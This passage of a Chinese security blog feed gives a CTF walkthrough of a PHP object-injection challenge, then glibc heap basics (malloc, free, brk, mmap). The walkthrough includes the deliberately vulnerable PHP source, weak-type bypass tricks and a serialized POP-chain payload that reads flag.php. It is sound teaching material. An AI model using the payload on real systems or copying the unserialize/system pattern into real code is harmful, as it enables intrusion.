class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">    <span class="comment">//flag is in flag.php </span></span><br><span class="line">    error_reporting(<span class="number">0</span>); </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">oops</span> </span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> $oop; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;oop = <span class="keyword">new</span> a(); </span><br><span class="line">        &#125; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;oop-&gt;action(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">a</span> </span>&#123; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Hello World!"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123; </span><br><span class="line">        <span class="keyword">private</span> $file; </span><br><span class="line">        <span class="keyword">private</span> $token; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">if</span> ((ord(<span class="keyword">$this</span>-&gt;token)&gt;<span class="number">47</span>)&amp;(ord(<span class="keyword">$this</span>-&gt;token)&lt;<span class="number">58</span>)) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"token can't be a number!"</span>; </span><br><span class="line">                <span class="keyword">return</span> ; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="number">0</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;file) &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'..'</span>)===<span class="keyword">FALSE</span>   </span><br><span class="line">                &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'/'</span>)===<span class="keyword">FALSE</span> &amp;&amp; stripos(<span class="keyword">$this</span>-&gt;file,<span class="string">'\\'</span>)==<span class="keyword">FALSE</span>) &#123; </span><br><span class="line">                    <span class="keyword">include</span>(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">                    <span class="keyword">echo</span> $flag; </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Oops..."</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123; </span><br><span class="line">        <span class="keyword">private</span> $cmd; </span><br><span class="line">        <span class="keyword">private</span> $token; </span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">execcmd</span><span class="params">()</span></span>&#123; </span><br><span class="line">            <span class="keyword">if</span> ((ord(<span class="keyword">$this</span>-&gt;token)&gt;<span class="number">47</span>)&amp;(ord(<span class="keyword">$this</span>-&gt;token)&lt;<span class="number">58</span>)) &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"token can't be a number!"</span>; </span><br><span class="line">                <span class="keyword">return</span> ; </span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="number">0</span>)&#123; </span><br><span class="line">                <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="keyword">$this</span>-&gt;cmd))&#123; </span><br><span class="line">                    system(<span class="keyword">$this</span>-&gt;cmd); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"Oops..."</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'a'</span>]) <span class="keyword">and</span> <span class="keyword">isset</span>($_GET[<span class="string">'b'</span>])) &#123; </span><br><span class="line">        $a=$_GET[<span class="string">'a'</span>]; </span><br><span class="line">        $b=$_GET[<span class="string">'b'</span>]; </span><br><span class="line">        <span class="keyword">if</span> (stripos($a,<span class="string">'.'</span>)) &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"You can't input '.' !"</span>; </span><br><span class="line">            <span class="keyword">return</span> ; </span><br><span class="line">        &#125; </span><br><span class="line">        $data = @file_get_contents($a,<span class="string">'r'</span>); </span><br><span class="line">        <span class="keyword">if</span> ($data==<span class="string">"HelloWorld!"</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"666"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"6668"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">8</span>)&#123; </span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"get c 2333......&lt;br&gt;"</span>; </span><br><span class="line">                unserialize($_GET[<span class="string">'c'</span>]); </span><br><span class="line">            &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"cccccc......"</span>; </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Oh no......"</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        show_source(<span class="keyword">__FILE__</span>); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>简单看下，考察两个点，一个是3处的弱类型校验，即参数a、b以及类成员变量token，另一个是反序列化pop链的构造。</p><h3 id="弱类型Bypass"><a href="#弱类型Bypass" class="headerlink" title="弱类型Bypass"></a>弱类型Bypass</h3><p>先看下参数a和b，要同时通过GET输入并绕过类型比较才能往下执行到反序列化的逻辑：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (stripos($a,<span class="string">'.'</span>)) &#123; </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You can't input '.' !"</span>; </span><br><span class="line"><span class="keyword">return</span> ; </span><br><span class="line">&#125; </span><br><span class="line">$data = @file_get_contents($a,<span class="string">'r'</span>); </span><br><span class="line"><span class="keyword">if</span> ($data==<span class="string">"HelloWorld!"</span> <span class="keyword">and</span> strlen($b)&gt;<span class="number">5</span> <span class="keyword">and</span> eregi(<span class="string">"666"</span>.substr($b,<span class="number">0</span>,<span class="number">1</span>),<span class="string">"6668"</span>) <span class="keyword">and</span> substr($b,<span class="number">0</span>,<span class="number">1</span>)!=<span class="number">8</span>)</span><br></pre></td></tr></table></figure><ul><li>对于参数a，不能输入“.”，过滤了跨目录访问，并且调用file_get_contents()函数读取名为a的文件内容，且内容为”HelloWorld!”——<strong>解决办法：file_get_contents()函数支持php伪协议，这里我们可以使用php:/input，然后再POST字符串”HelloWorld!”即可绕过</strong></li><li>对于参数b，其长度必须大于5，第一个字符紧接着拼接在”666”字符串后面要能正则匹配上”6668”字符串，且限定第一个字符不能为8——<strong>解决办法：这里限定了参数第一个字符不能为8，但是缺陷在于使用正则匹配，我们这里可以使用%00截断作为参数b的起始字符，截断掉后面的字符从而实现666和6668能够匹配成功实现绕过，剩下的字符拼够5个字节以上即可</strong></li></ul><p>再看下成员变量token，其在类b和类c中均存在：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123; </span><br><span class="line">       <span class="keyword">private</span> $file; </span><br><span class="line">       <span class="keyword">private</span> $token; </span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">action</span><span class="params">()</span> </span>&#123; </span><br><span class="line">           <span class="keyword">if</span> ((ord(<span class="keyword">$this</span>-&gt;token)&gt;<span class="number">47</span>)&amp;(ord(<span class="keyword">$this</span>-&gt;token)&lt;<span class="number">58</span>)) &#123; </span><br><span class="line">               <span class="keyword">echo</span> <span class="string">"token can't be a number!"</span>; </span><br><span class="line">               <span class="keyword">return</span> ; </span><br><span class="line">           &#125; </span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="number">0</span>)&#123; </span><br><span class="line">               ...</span><br><span class="line"></span><br><span class="line">   <span class="class"><span class="keyword">class</span> <span class="title">c</span> </span>&#123; </span><br><span class="line">       <span class="keyword">private</span> $cmd; </span><br><span class="line">       <span class="keyword">private</span> $token; </span><br><span class="line">       <span class="function"><span class="keyword">function</span> <span class="title">execcmd</span><span class="params">()</span></span>&#123; </span><br><span class="line">           <span class="keyword">if</span> ((ord(<span class="keyword">$this</span>-&gt;token)&gt;<span class="number">47</span>)&amp;(ord(<span class="keyword">$this</span>-&gt;token)&lt;<span class="number">58</span>)) &#123; </span><br><span class="line">               <span class="keyword">echo</span> <span class="string">"token can't be a number!"</span>; </span><br><span class="line">               <span class="keyword">return</span> ; </span><br><span class="line">           &#125; </span><br><span class="line">           <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;token==<span class="number">0</span>)&#123; </span><br><span class="line">               ...</span><br></pre></td></tr></table></figure><p>可以看到，先判断token是否为数字字符，不是才会往下判断token的值是否为0，为0则进入关键代码。<strong>但是这里判断是否为0的符号是==，存在弱类型绕过，当我们输入一个字符如a时，’a’==0是成立的。</strong></p><h3 id="pop链构造"><a href="#pop链构造" class="headerlink" title="pop链构造"></a>pop链构造</h3><p>我们回到几个类的定义中再看看，发现只有oops类存在魔法函数__construct()和__destruct()，分析该函数：</p><ul><li>成员变量oop，在__construct()函数中初始化为a类的实例；</li><li>__construct()函数，初始化成员变量oop为a类的实例；</li><li>__destruct()函数，调用oop实例的action()方法；</li></ul><p>再看看其他几个类：</p><ul><li>a类只有输出Hello World的action()方法，无漏洞点；</li><li>b类有个action()方法，含有成员变量file和token，绕过token校验之后就过滤file的跨目录，然后直接输出目标文件的flag变量值；</li><li>c类有个execcmd()方法，但是和opps类__destruct()函数中调用的action()方法完全不同名，就是个坑哈哈；</li></ul><p>这么说，能利用的只有b类，且和源码注释中提示的flag在flag.php中吻合，那就直接构造payload即可：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">oops</span> </span>&#123; </span><br><span class="line">        <span class="keyword">protected</span> $oop; </span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123; </span><br><span class="line">            <span class="keyword">$this</span>-&gt;oop = <span class="keyword">new</span> b(); </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">b</span> </span>&#123; </span><br><span class="line">        <span class="keyword">private</span> $file = <span class="string">"flag.php"</span>; </span><br><span class="line">        <span class="keyword">private</span> $token = <span class="string">"a"</span>; </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> oops()));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>输出参数c的exp为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A4%3A%22oops%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00oop%22%3BO%3A1%3A%22b%22%3A2%3A%7Bs%3A7%3A%22%00b%00file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A8%3A%22%00b%00token%22%3Bs%3A1%3A%22a%22%3B%7D%7D</span><br></pre></td></tr></table></figure><h3 id="getflag"><a href="#getflag" class="headerlink" title="getflag"></a>getflag</h3><p>最后结合前面a、b参数的Bypass exp，直接构造报文发包即可get flag：</p><p><img src="/2019/05/04/PHP对象注入之pop链构造/2.png" alt=""></p><h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a href="https://www.cnblogs.com/iamstudy/articles/php_object_injection_pop_chain.html" target="_blank" rel="noopener">php对象注入-pop链的构造</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/php_unserialize_pop_2.html" target="_blank" rel="noopener">php反序列化pop链一则</a></p><p><a href="https://cl0und.github.io/2017/10/01/POP%E9%93%BE%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">POP链学习| cL0und</a></p>]]></content>
    
    <summary type="html">
    
      已完结.
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>堆基础</title>
    <link href="https://Mi1k7ea.github.com/2019/04/27/%E5%A0%86%E5%9F%BA%E7%A1%80/"/>
    <id>https://Mi1k7ea.github.com/2019/04/27/堆基础/</id>
    <published>2019-04-27T14:49:52.000Z</published>
    <updated>2019-05-28T14:15:25.891Z</updated>
    
    <content type="html"><![CDATA[<p>网上太多关于这方面的文章了，这里不再重新造轮子了，直接引用ctf wiki以及其他的一些文章的说明，自己再添点东西就好。</p><h2 id="0x01-何为堆"><a href="#0x01-何为堆" class="headerlink" title="0x01 何为堆"></a>0x01 何为堆</h2><blockquote><p>在程序运行过程中，堆可以提供动态分配的内存，允许程序申请大小未知的内存。堆其实就是程序虚拟地址空间的一块连续的线性区域，它由低地址向高地址方向增长。我们一般称管理堆的那部分程序为堆管理器。</p><p>堆管理器处于用户程序与内核中间，主要做以下工作</p><ol><li>响应用户的申请内存请求，向操作系统申请内存，然后将其返回给用户程序。同时，为了保持内存管理的高效性，内核一般都会预先分配很大的一块连续的内存，然后让堆管理器通过某种算法管理这块内存。只有当出现了堆空间不足的情况，堆管理器才会再次与操作系统进行交互。</li><li>管理用户所释放的内存。一般来说，用户释放的内存并不是直接返还给操作系统的，而是由堆管理器进行管理。这些释放的内存可以来响应用户新申请的内存的请求。</li></ol><p>Linux 中早期的堆分配与回收由 Doug Lea 实现，但它在并行处理多个线程时，会共享进程的堆内存空间。因此，为了安全性，一个线程使用堆时，会进行加锁。然而，与此同时，加锁会导致其它线程无法使用堆，降低了内存分配和回收的高效性。同时，如果在多线程使用时，没能正确控制，也可能影响内存分配和回收的正确性。Wolfram Gloger 在 Doug Lea 的基础上进行改进使其可以支持多线程，这个堆分配器就是 ptmalloc 。在 glibc-2.3.x. 之后，glibc 中集成了 ptmalloc2。</p><p>目前 Linux 标准发行版中使用的堆分配器是 glibc 中的堆分配器：ptmalloc2。ptmalloc2 主要是通过 malloc/free 函数来分配和释放内存块。</p><p>需要注意的是，在内存分配与使用的过程中，Linux 有这样的一个基本内存管理思想，<strong>只有当真正访问一个地址的时候，系统才会建立虚拟页面与物理页面的映射关系</strong>。 所以虽然操作系统已经给程序分配了很大的一块内存，但是这块内存其实只是虚拟内存。只有当用户使用到相应的内存时，系统才会真正分配物理页面给用户使用。</p></blockquote><h2 id="0x02-堆的基本操作"><a href="#0x02-堆的基本操作" class="headerlink" title="0x02 堆的基本操作"></a>0x02 堆的基本操作</h2><p>这里主要说下基本的堆操作（包括堆的分配，回收，堆分配背后的系统调用）以及堆目前的多线程支持等。</p><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">malloc(size_t n)</span><br></pre></td></tr></table></figure><p>malloc 函数返回对应大小字节的内存块的指针。此外，该函数还对一些异常情况进行了处理</p><ul><li>当 n=0 时，返回当前系统允许的堆的最小内存块。</li><li>当 n 为负数时，由于在大多数系统上，<strong>size_t 是无符号数（这一点非常重要）</strong>，所以程序就会申请很大的内存空间，但通常来说都会失败，因为系统没有那么多的内存可以分配。</li></ul><h3 id="free"><a href="#free" class="headerlink" title="free"></a>free</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(void* p)</span><br></pre></td></tr></table></figure><p>free 函数会释放由 p 所指向的内存块。这个内存块有可能是通过 malloc 函数得到的，也有可能是通过相关的函数 realloc 得到的。</p><p>此外，该函数也同样对异常情况进行了处理</p><ul><li><strong>当 p 为空指针时，函数不执行任何操作。</strong></li><li>当 p 已经被释放之后，再次释放会出现乱七八糟的效果，这其实就是 <code>double free</code>。</li><li>除了被禁用 (mallopt) 的情况下，当释放很大的内存空间时，程序会将这些内存空间还给系统，以便于减小程序所使用的内存空间。</li></ul><h3 id="内存分配背后的系统调用"><a href="#内存分配背后的系统调用" class="headerlink" title="内存分配背后的系统调用"></a>内存分配背后的系统调用</h3><blockquote><p>在前面提到的函数中，无论是 malloc 函数还是 free 函数，我们动态申请和释放内存时，都经常会使用，但是它们并不是真正与系统交互的函数。这些函数背后的系统调用主要是 <a href="http://man7.org/linux/man-pages/man2/sbrk.2.html" target="_blank" rel="noopener">(s)brk</a> 函数以及 <a href="http://man7.org/linux/man-pages/man2/mmap.2.html" target="_blank" rel="noopener">mmap, munmap</a> 函数。</p><p>如下图所示，我们主要考虑对堆进行申请内存块的操作。</p></blockquote><p><img src="/2019/04/27/堆基础/1.png" alt=""></p><h4 id="s-brk"><a href="#s-brk" class="headerlink" title="(s)brk"></a>(s)brk</h4><blockquote><p>对于堆的操作，操作系统提供了 brk 函数，glibc 库提供了 sbrk 函数，我们可以通过增加 <a href="https://en.wikipedia.org/wiki/Sbrk" target="_blank" rel="noopener">brk</a> 的大小来向操作系统申请内存。初始时，堆的起始地址 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365" target="_blank" rel="noopener">start_brk</a> 以及堆的当前末尾 <a href="http://elixir.free-electrons.com/linux/v3.8/source/include/linux/mm_types.h#L365" target="_blank" rel="noopener">brk</a> 指向同一地址。根据是否开启 ASLR，两者的具体位置会有所不同</p><ul><li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data/bss 段的结尾。</li><li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data/bss 段结尾后的随机偏移处。</li></ul><p>具体效果如下图（这个图片与网上流传的基本一致，这里是因为要画一张大图，所以自己单独画了下）所示</p></blockquote><p><img src="/2019/04/27/堆基础/2.png" alt=""></p><p>示例：</p><p>在每一次执行完操作后，都执行了 getchar() 函数，这是为了方便查看程序真正的映射。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* sbrk and brk example */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">void</span> *curr_brk, *tmp_brk = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to sbrk example:%d\n"</span>, getpid());</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* sbrk(0) gives current program break location */</span></span><br><span class="line">        tmp_brk = curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Program Break Location1:%p\n"</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* brk(addr) increments/decrements program break location */</span></span><br><span class="line">        brk(curr_brk+<span class="number">4096</span>);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Program break Location2:%p\n"</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        brk(tmp_brk);</span><br><span class="line"></span><br><span class="line">        curr_brk = sbrk(<span class="number">0</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Program Break Location3:%p\n"</span>, curr_brk);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在第一次调用brk()之前</strong></p><p>可以看出，并没有出现堆。此时：</p><p>start_brk = end_data = brk = 0x0x230d000</p><p><img src="/2019/04/27/堆基础/3.png" alt=""></p><p><strong>第一次调用brk()——增加内存</strong></p><p>已经出现了堆段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brk(curr_brk+4096);</span><br></pre></td></tr></table></figure><p>通过增加brk的大小来向OS申请内存，较之前申请了0x1000即4096字节的内存空间。此时：</p><p>start_brk = end_data = 0x0230d000</p><p>brk = 0x0230e000</p><p><img src="/2019/04/27/堆基础/4.png" alt=""></p><p>其中，关于堆的那一行</p><ul><li>0x0230d000是相应堆的起始地址</li><li>rw-p表明堆具有可读可写权限，并且属于隐私数据</li><li>00000000 表明文件偏移，由于这部分内容并不是从文件中映射得到的，所以为0</li><li>00:00是主从 (Major/mirror) 的设备号，这部分内容也不是从文件中映射得到的，所以也都为0</li><li>0表示着Inode 号。由于这部分内容并不是从文件中映射得到的，所以为0</li></ul><p><strong>第二次调用brk()——减少内存</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brk(tmp_brk);</span><br></pre></td></tr></table></figure><p>通过减少brk的大小，使堆的内存空间减至初始的大小。此时：</p><p>start_brk = end_data = brk = 0x0x230d000</p><p>恢复为了之前的状态，没有heap段。</p><p><img src="/2019/04/27/堆基础/5.png" alt=""></p><h4 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h4><blockquote><p>malloc 会使用 <a href="http://lxr.free-electrons.com/source/mm/mmap.c?v=3.8#L1285" target="_blank" rel="noopener">mmap</a> 来创建独立的匿名映射段。匿名映射的目的主要是可以申请以 0 填充的内存，并且这块内存仅被调用进程所使用。</p></blockquote><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Private anonymous mapping example using mmap syscall */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="keyword">static</span> <span class="keyword">inline</span> <span class="title">errExit</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s failed. Exiting the process\n"</span>, msg);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> ret = <span class="number">-1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Welcome to private anonymous mapping example::PID:%d\n"</span>, getpid());</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"Before mmap\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">char</span>* addr = <span class="literal">NULL</span>;</span><br><span class="line">        addr = mmap(<span class="literal">NULL</span>, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>, PROT_READ|PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (addr == MAP_FAILED)</span><br><span class="line">                errExit(<span class="string">"mmap"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After mmap\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Unmap mapped region. */</span></span><br><span class="line">        ret = munmap(addr, (<span class="keyword">size_t</span>)<span class="number">132</span>*<span class="number">1024</span>);</span><br><span class="line">        <span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">                errExit(<span class="string">"munmap"</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"After munmap\n"</span>);</span><br><span class="line">        getchar();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>在执行 mmap 之前</strong></p><p>可以从下面的输出看到，目前只有. so文件的mmap段：</p><p><img 